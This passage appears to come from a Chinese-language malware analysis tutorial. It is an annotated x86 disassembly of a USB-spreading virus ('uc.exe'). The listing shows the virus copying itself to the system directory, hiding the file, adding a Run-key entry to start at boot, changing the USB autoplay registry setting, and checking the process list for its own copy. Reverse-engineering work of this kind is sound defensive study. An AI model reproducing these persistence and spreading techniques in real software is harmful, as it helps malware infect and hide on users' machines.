
`00401294`       `|.` `85C0`       `test` `eax, eax`；检查文件是否存在  

`00401296`       `|.` `5E`         `pop` `esi`  

`00401297`       `|.` `75 2F`      `jnz` `short 004012C8`；如果文件已经存在就跳  

`00401299`       `|.` `8D5424 00`  `lea` `edx, dword ptr [esp]`  

`0040129D`       `|.` `50`         `push` `eax`                    ; `/FailIfExists`

`0040129E`       `|.` `52`         `push` `edx`                    ; `|NewFileName`

`0040129F`       `|.` `68 708A4000` `push` `00408A70`             

`004012A4`       `|.` `FF15 347040>` `call` `dword ptr [<&KERNEL32.CopyF>; \CopyFileA`

；把文件复制到系统目录  

`004012AA`       `|.` `8D4424 00`  `lea` `eax, dword ptr [esp]`  

`004012AE`       `|.` `50`         `push` `eax`  

`004012AF`       `|.` `E8 7C000000` `call` `00401330`  

；修改注册表，使病毒文件开机自启动和 U 盘自动播放  

`00401330`       `/$` `83EC 08`    `sub` `esp, 8`  

`00401333`       `|.` `56`         `push` `esi`  

`00401334`       `|.` `8B35 087040>` `mov` `esi, dword ptr >; ADVAPI32.RegOpenKeyA`  

`0040133A`       `|.` `8D4424 04`  `lea` `eax, dword ptr >`  

`0040133E`       `|.` `57`         `push` `edi`  

`0040133F`       `|.` `50`         `push` `eax`         ; `/pHandle`

`00401340`       `|.` `68 E0804000` `push` `004080E0`      ; `|Subkey = "Software\Microsoft\Windows\CurrentVersion\Policies\Explorer"`

`00401345`       `|.` `68 01000080` `push` `80000001`      ; `|hKey = HKEY_CURRENT_USER`

`0040134A`       `|.` `C74424 18 0>` `mov` `dword ptr [esp+>; |`

`00401352`       `|.` `FFD6`       `call` `esi`         ; `\RegOpenKeyA`

`00401354`       `|.` `8B5424 08`  `mov` `edx, dword ptr >`  

`00401358`       `|.` `8B3D 007040>` `mov` `edi, dword ptr >; ADVAPI32.RegSetValueExA`  

`0040135E`       `|.` `8D4C24 0C`  `lea` `ecx, dword ptr >`  

`00401362`       `|.` `6A 04`      `push` `4`         ; `/BufSize = 4`

`00401364`       `|.` `51`         `push` `ecx`       ; `|Buffer`

`00401365`       `|.` `6A 04`      `push` `4`         ; `|ValueType = REG_DWORD`

`00401367`       `|.` `6A 00`      `push` `0`         ; `|Reserved = 0`

`00401369`       `|.` `68 CC804000` `push` `004080CC`    ; `|ValueName = "NoDriveTypeAutoRun"`

`0040136E`       `|.` `52`         `push` `edx`       ; `|hKey`

`0040136F`       `|.` `FFD7`       `call` `edi`       ; `\RegSetValueExA`

`00401371`       `|.` `8D4424 08`  `lea` `eax, dword ptr >`  

`00401375`       `|.` `50`         `push` `eax`       ; `/pHandle`

`00401376`       `|.` `68 9C804000` `push` `0040809C`    ; `|Subkey = "SOFTWARE\MICROSOFT\Windows\CurrentVersion\Run"`

`0040137B`       `|.` `68 02000080` `push` `80000002`    ; `|hKey = HKEY_LOCAL_MACHINE`

`00401380`       `|.` `FFD6`       `call` `esi`       ; `\RegOpenKeyA`

`00401382`       `|.` `85C0`       `test` `eax, eax`  

`00401384`       `|.` `75 35`      `jnz` `short 004013BB`  

`00401386`       `|.` `8B7424 14`  `mov` `esi, dword ptr >`  

`0040138A`       `|.` `56`         `push` `esi`       ; `/String`

`0040138B`       `|.` `FF15 1C7040>` `call` `dword ptr [<&KE>; \lstrlenA`  

`00401391`       `|.` `8B0D 448040>` `mov` `ecx, dword ptr >; auto.00408060`  

`00401397`       `|.` `8B5424 08`  `mov` `edx, dword ptr >`  

`0040139B`       `|.` `50`         `push` `eax`       ; `/BufSize`

`0040139C`       `|.` `56`         `push` `esi`       ; `|Buffer`

`0040139D`       `|.` `6A 01`      `push` `1`         ; `|ValueType = REG_SZ`

`0040139F`       `|.` `6A 00`      `push` `0`         ; `|Reserved = 0`

`004013A1`       `|.` `51`         `push` `ecx`       ; `|ValueName => "uc.exe"`

`004013A2`       `|.` `52`         `push` `edx`       ; `|hKey`

`004013A3`       `|.` `FFD7`       `call` `edi`       ; `\RegSetValueExA`

`004013A5`       `|.` `8B4424 08`  `mov` `eax, dword ptr >`  

`004013A9`       `|.` `50`         `push` `eax`       ; `/hKey`

`004013AA`       `|.` `FF15 047040>` `call` `dword ptr [<&AD>; \RegCloseKey`  

`004013B0`       `|.` `5F`         `pop` `edi`  

`004013B1`       `|.` `B8 01000000` `mov` `eax, 1`  

`004013B6`       `|.` `5E`         `pop` `esi`  

`004013B7`       `|.` `83C4 08`    `add` `esp, 8`  

`004013BA`       `|.` `C3`         `retn`  

`004013BB`       `|>` `5F`         `pop` `edi`  

`004013BC`       `|.` `33C0`       `xor` `eax, eax`  

`004013BE`       `|.` `5E`         `pop` `esi`  

`004013BF`       `|.` `83C4 08`    `add` `esp, 8`  

`004013C2`       `\.` `C3`         `retn`  

`004012B4`       `|.` `8D4C24 04`  `lea` `ecx, dword ptr [esp+4]`  

`004012B8`       `|.` `51`         `push` `ecx`  

`004012B9`       `|.` `E8 62000000` `call` `00401320`  

;设置病毒文件的属性为系统，隐藏  

`00401320`       `/$` `8B4424 04`  `mov` `eax, dword ptr >`  

`00401324`       `|.` `6A 06`      `push` `6`         ; `/FileAttributes = HIDDEN|SYSTEM`

`00401326`       `|.` `50`         `push` `eax`       ; `|FileName`

`00401327`       `|.` `FF15 187040>` `call` `dword ptr [<&KE>; \SetFileAttributesA`  

`0040132D`       `\.` `C3`         `retn`  

；如果病毒文件已经在系统目录下，执行下面的操作，这里从 `00401297` 跳过来  

`004012C8`       `|>` `E8 D3030000` `call` `004016A0`  

;通过枚举进程列表查看自身是否已经运行  

`004016A0`       `/$` `81EC 280100>` `sub` `esp, 128`  

`004016A6`       `|.` `56`         `push` `esi`  

`004016A7`       `|.` `57`         `push` `edi`  

`004016A8`       `|.` `6A 00`      `push` `0`         ; `/ProcessID = 0`

`004016AA`       `|.` `6A 02`      `push` `2`         ; `|Flags = TH32CS_SNAPPROCESS`  

`004016AC`       `|.` `E8 BB000000` `call` `<jmp.&KERNEL32.>; \CreateToolhelp32Snapshot`  

`004016B1`       `|.` `8BF0`       `mov` `esi, eax`  

`004016B3`       `|.` `8D4424 08`  `lea` `eax, dword ptr >`  

`004016B7`       `|.` `50`         `push` `eax`       ; `/lppe`

`004016B8`       `|.` `56`         `push` `esi`       ; `|hSnapshot`

`004016B9`       `|.` `C74424 10 2>` `mov` `dword ptr [esp+>; |`

`004016C1`       `|.` `E8 A0000000` `call` `<jmp.&KERNEL32.>; \Process32First`  

`004016C6`       `|.` `85C0`       `test` `eax, eax`  

`004016C8`       `|.` `74 4E`      `je` `short 00401718`  

`004016CA`       `|.` `8B0D 448040>` `mov` `ecx, dword ptr >; auto.00408060`  

`004016D0`       `|.` `8B3D 287040>` `mov` `edi, dword ptr >; kernel32.lstrcmpA`  

`004016D6`       `|.` `8D5424 2C`  `lea` `edx, dword ptr >`  

`004016DA`       `|.` `51`         `push` `ecx`       ; `/String2 => "uc.exe"`

`004016DB`       `|.` `52`         `push` `edx`       ; `|String1`

`004016DC`       `|.` `FFD7`       `call` `edi`       ; `\lstrcmpA`

`004016DE`       `|.` `85C0`       `test` `eax, eax`  

`004016E0`       `|.` `74 21`      `je` `short 00401703`  

`004016E2`       `|>` `8D4424 08`  `/lea` `eax, dword ptr>`

`004016E6`       `|.` `50`         `|push` `eax`        ; `/lppe`

`004016E7`       `|.` `56`         `|push` `esi`        ; `|hSnapshot`

`004016E8`       `|.` `E8 73000000` `|call` `<jmp.&KERNEL32>; \Process32Next`  

`004016ED`       `|.` `85C0`       `|test` `eax, eax`  

`004016EF`       `|.` `74 27`      `|je` `short 00401718`  

`004016F1`       `|.` `8B0D 448040>` `|mov` `ecx, dword ptr >; auto.00408060`  

`004016F7`       `|.` `8D5424 2C`  `|lea` `edx, dword ptr>`

`004016FB`       `|.` `51`         `|push` `ecx`  

`004016FC`       `|.` `52`         `|push` `edx`  

`004016FD`       `|.` `FFD7`       `|call` `edi`  

`004016FF`       `|.` `85C0`       `|test` `eax, eax`  

`00401701`       `|.^` `75 DF`     `\jnz` `short 004016E2`  

`00401703`       `|>` `56`         `push` `esi`       ; `/hObject`

`00401704`       `|.` `FF15 207040>` `call` `dword ptr [<&KE>; \CloseHandle`  

`0040170A`       `|.` `5F`         `pop` `edi`  

`0040170B`       `|.` `B8 01000000` `mov` `eax, 1`；返回值为 1  

`00401710`       `|.` `5E`         `pop` `esi`  

`00401711`       `|.` `81C4 280100>` `add` `esp, 128`  

`00401717`       `|.` `C3`         `retn`  

`00401718`       `|>` `56`         `push` `esi`       ; `/hObject`

`00401719`       `|.` `FF15 207040>` `call` `dword ptr [<&KE>; \CloseHandle`  

`0040171F`       `|.` `5F`         `pop` `edi`  

`00401720`       `|.` `33C0`       `xor` `eax, eax`；返回值为 0  

`00401722`       `|.` `5E`         `pop` `esi`  

`00401723`       `|.` `81C4 280100>` `add` `esp, 128`  

`00401729`       `\.` `C3`         `retn`  

；判断自身有没有运行  

`004012CD`       `|.` `85C0`       `test` `eax, eax`；通过在 `eax` 的返回值判断
